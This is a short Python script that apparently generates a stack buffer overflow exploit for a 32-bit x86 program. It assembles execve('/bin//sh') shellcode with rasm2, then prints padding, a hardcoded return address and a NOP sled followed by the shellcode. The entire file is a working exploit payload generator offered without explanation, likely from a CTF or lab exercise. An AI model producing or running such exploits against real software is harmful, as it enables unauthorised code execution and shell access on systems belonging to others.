#!/usr/bin/env python


from __future__ import print_function
import subprocess as sb
import struct


def assemble(asmcode):
    fln = "/tmp/tmp-rasm2.asm"
    open(fln, 'w').write(asmcode)
    payload = sb.Popen(["rasm2", "-a", "x86.nasm", "-Bf", fln], stdout=sb.PIPE).communicate()[0]

    return payload


def main():
    shc = """.bits 32
nop
nop

sub esp, 0x40           ; ----------   3         83ec40

xor eax, eax            ; 0x00000000   2           31c0
cdq                     ; 0x00000002   1             99
push eax                ; 0x00000003   1             50
push 0x68732f2f         ; 0x00000004   5     682f2f7368  ; //sh
push 0x6e69622f         ; 0x00000009   5     682f62696e  ; /bin
mov ebx, esp            ; 0x0000000e   2           89e3
push eax                ; 0x00000010   1             50
push ebx                ; 0x00000011   1             53
mov ecx, esp            ; 0x00000012   2           89e1
mov al, 0xb             ; 0x00000014   2           b00b  ; __NR_execve
int 0x80                ; 0x00000016   2           cd80
"""

    retaddr = 0xffffd560
    a = "a" * 34 + struct.pack("<I", retaddr) + "\x90" * 0x40 + assemble(shc)

    print(a, end='')


if __name__ == '__main__':
    main()
